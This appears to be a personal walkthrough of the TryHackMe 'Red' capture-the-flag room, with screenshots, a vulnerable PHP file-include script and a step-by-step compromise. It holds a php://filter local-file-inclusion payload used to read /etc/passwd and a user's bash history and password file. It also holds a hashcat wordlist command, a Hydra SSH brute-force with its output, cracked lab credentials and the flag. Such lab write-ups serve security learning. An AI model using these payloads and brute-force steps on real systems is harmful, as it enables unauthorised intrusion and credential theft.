**15072023Sat**

```
A classic battle for the ages.
```

[TryHackMe | Red](https://tryhackme.com/room/redisl33t)

![[Pasted image 20230715092744.png]]

![[Pasted image 20230715092802.png]]

![[Pasted image 20230715093316.png]]

![[Pasted image 20230715093430.png]]

**16072023Sun**

https://www.youtube.com/@osmandagdelen9575

[# Red - CTF (TryHackMe) | RED VS BLUE | detail explained](https://youtu.be/2_9RYyVaqI4)

```
<?php 

function sanitize_input($param) {
    $param1 = str_replace("../","",$param);
    $param2 = str_replace("./","",$param1);
    return $param2;
}

$page = $_GET['page'];
if (isset($page) && preg_match("/^[a-z]/", $page)) {
    $page = sanitize_input($page);
    readfile($page);
} else {
    header('Location: /index.php?page=home.html');
}

?>
```

```
This PHP code appears to be a simple file retrieval script with basic input sanitization to mitigate directory traversal attacks. Let's break it down step by step:

1. The code defines a function called `sanitize_input($param)`, which takes a parameter `$param` (presumably user input) and sanitizes it by removing occurrences of "../" and "./" using the `str_replace()` function. This is done to prevent directory traversal attacks, where an attacker tries to access files outside the intended directory.
    
2. The code then attempts to retrieve a value from the `$_GET` superglobal array with the key "page" using `$page = $_GET['page'];`. This suggests that the script expects a URL parameter like "?page=some_file.html".
    
3. The script checks if the "page" parameter is set and if it matches a regular expression `/^[a-z]/`. This regex checks if the parameter starts with a lowercase letter.
    
4. If the parameter is set and passes the regex check, the script calls the `sanitize_input($page)` function to sanitize the user input. The sanitized input is then used as a filename in the `readfile()` function, which reads and outputs the contents of the specified file to the browser.
    
5. If the "page" parameter is not set or does not pass the regex check, the script redirects the user to "/index.php?page=home.html". This is a fallback behavior to ensure that the user is always directed to a valid page.
    

It's worth noting that while this code includes some basic input sanitization, it should not be considered a comprehensive security measure. Proper security practices require additional measures such as validating the input against a predefined list of allowed files and using more advanced security functions and mechanisms to prevent various attacks.
```

```
php://filter/resource=/etc/passwd
```

![[Pasted image 20230716120409.png]]

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
blue:x:1000:1000:blue:/home/blue:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
red:x:1001:1001::/home/red:/bin/bash
```

![[Pasted image 20230716120737.png]]

![[Pasted image 20230716120818.png]]

```
NAME="Ubuntu"
VERSION="20.04.4 LTS (Focal Fossa)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 20.04.4 LTS"
VERSION_ID="20.04"
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
VERSION_CODENAME=focal
UBUNTU_CODENAME=focal
```

```
php://filter/resource=/home/blue/.bash_history
```

```
echo "Red rules"
cd
hashcat --stdout .reminder -r /usr/share/hashcat/rules/best64.rule > passlist.txt
cat passlist.txt
rm passlist.txt
sudo apt-get remove hashcat -y
```

```
php://filter/resource=/home/blue/.reminder
```

```
sup3r_p@s$w0rd!
```

```
hashcat --stdout .reminder -r /usr/share/hashcat/rules/best64.rule > passlist.txt
```

```
hydra -l blue -P passlist.txt ssh://10.10.54.182
```

![[Pasted image 20230716134923.png]]

```
hydra -l blue -P passlist.txt ssh://10.10.54.182
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-07-16 13:48:32
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 77 login tries (l:1/p:77), ~5 tries per task
[DATA] attacking ssh://10.10.54.182:22/
[22][ssh] host: 10.10.54.182   login: blue   password: sup3r_p@s$w0sup3r_p@s$w0
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 3 final worker threads did not complete until end.
[ERROR] 3 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-07-16 13:48:51
```

```
ssh blue@10.10.54.182
```

```
sup3r_p@s$w0sup3r_p@s$w0
```

```
sup3r_p@s$w0rd!9
```

![[Pasted image 20230716135507.png]]

![[Pasted image 20230716135600.png]]

```
THM{Is_thAt_all_y0u_can_d0_blU3?}
```

![[Pasted image 20230716135754.png]]

![[Pasted image 20230716140044.png]]

